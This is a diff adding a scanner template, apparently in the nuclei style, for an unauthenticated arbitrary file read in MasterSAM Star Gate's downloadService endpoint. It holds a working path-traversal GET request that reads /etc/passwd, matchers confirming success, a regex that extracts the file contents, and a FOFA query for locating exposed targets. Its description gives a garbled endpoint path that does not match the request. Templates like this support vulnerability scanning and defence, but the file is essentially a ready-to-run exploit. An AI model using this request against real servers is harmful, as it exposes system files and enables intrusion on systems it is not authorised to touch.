@@ -1,0 +1,26 @@
+## id: VEID-2025-0106
+## name: MasterSAM接口downloadService任意文件读取
+## author: hack007x
+## severity: critical
+## tags: veid,file,veid2025
+## description:MasterSAM Star Gate的/adamaladamalduwnoadService接口存在任意文件下载漏洞，未经身份验证的攻击者可以通过该漏洞下载服务器任意文件，从而获取大量敏感信息。
+## fofa-query: body="MasterSAM"
+## verification: true
+
+
+GET /adama/adama/downloadService?type=1&file=../../../../etc/passwd HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: header["Content-Type"] contains "application"
+#@ matcher: body matches /root:[^:]*:[0-9]+:[0-9]+:/
+#> extract: name=etc_passwd, from=body, regex=/(root:[^:]*:[0-9]+:[0-9]+:[^:]*:[^:]*:\/[^\n]+)/, group=1
+
+
+
+
+
+# @VEIL-STAMP: 801d1d17857a5587e62ce5927dccab2c89c06c9905b87cb982bb0c5f7a8dbbe1
